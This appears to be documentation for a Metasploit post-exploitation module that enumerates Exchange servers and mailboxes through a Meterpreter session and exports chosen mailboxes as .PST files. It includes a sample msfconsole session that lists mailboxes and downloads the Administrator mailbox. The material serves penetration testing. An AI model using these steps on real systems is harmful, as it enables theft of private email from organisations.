## Vulnerable Application

  This module will gather information from an on-premise Exchange Server running on the target machine.

  Two actions are supported:

  `LIST` (default action): List basic information about all Exchange servers and mailboxes hosted on the target.

  `EXPORT`: Export and download a chosen mailbox in the form of a .PST file, with support for an optional filter keyword.

  It requires that the effective Meterpreter session user be assigned to the "Organization Management" role group.

## Verification Steps

  1. Start msfconsole
  2. Get meterpreter session on a Windows target running an Exchange Server
  3. Do: `use post/windows/gather/exchange`
  4. Do: `set SESSION <session id>`
  5. Do: `run`

## Options

### FILTER

  Filter to use when exporting a mailbox.

  See [Microsoft documentation](https://docs.microsoft.com/en-us/exchange/filterable-properties-for-the-contentfilter-parameter)
  for valid values.

  Unused for LIST action, optional for EXPORT action.

### MAILBOX

  Mailbox to export. Can be a mailbox's email address or display name.

  Unused for LIST action, required for EXPORT action.

### DownloadSizeThreshold

  The file size of export results after which a prompt will appear to confirm the download, in MB.

  Option takes a float number. Default value is 50.0.

### SkipLargeDownloads

  If set to `true`, automatically skip downloading export results that are larger than `DownloadSizeThreshold` (don't show prompt).

  Set to `false` by default.

## Extracted data

### LIST action
  For every server:

  - Server name
  - Server version
  - Server role
  - For every mailbox in server:
    - Mailbox display name
    - Mailbox email addresses
    - Mailbox creation date
    - Mailbox address list membership
    - For every folder in mailbox:
      - Folder Path
      - Items in folder
      - Folder size
      - Newest item received date

### EXPORT action
  .PST file with the chosen mailbox's mail items

## Scenarios

### Windows Server 2012 R2 with On-Premise Exchange Server 2010

```
msf6 exploit(multi/handler) > use post/windows/gather/exchange
msf6 post(windows/gather/exchange) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/exchange) > run -a LIST

[+] Exchange Server is present on target machine
[+] PowerShell is present on target machine
[+] Listing reachable servers and mailboxes:
----------
Server:
- Name: WIN-49S7K9MJUAF
- Version: Version 14.3 (Build 123.4)
- Role: Mailbox, ClientAccess, HubTransport
-----
Mailboxes:
---
- Display Name: Administrator
- Email Addresses: SMTP:Administrator@example.corp
- Creation date: 12/02/2020 01:01:43
- Address list membership: \Mailboxes(VLV) \All Mailboxes(VLV) \All Recipients(VLV) \Default Global Address List \All Users
- (All folders are empty)
---

[...]

[*] Post module execution completed
msf6 post(windows/gather/exchange) > set MAILBOX "Administrator"
MAILBOX => Administrator
msf6 post(windows/gather/exchange) > run -a EXPORT

[+] Exchange Server is present on target machine
[+] PowerShell is present on target machine
[+] Exporting mailbox 'Administrator':
Exporting mailbox...
. Queued
. Queued
. Queued
. InProgress
. Completed
Exporting done
[*] Resulting export file size: 0.26 MB
[+] PST saved in: /home/user/.msf4/loot/20210309120402_default_192.168.1.70_PST_427036.pst
[*] Post module execution completed
msf6 post(windows/gather/exchange) >
```
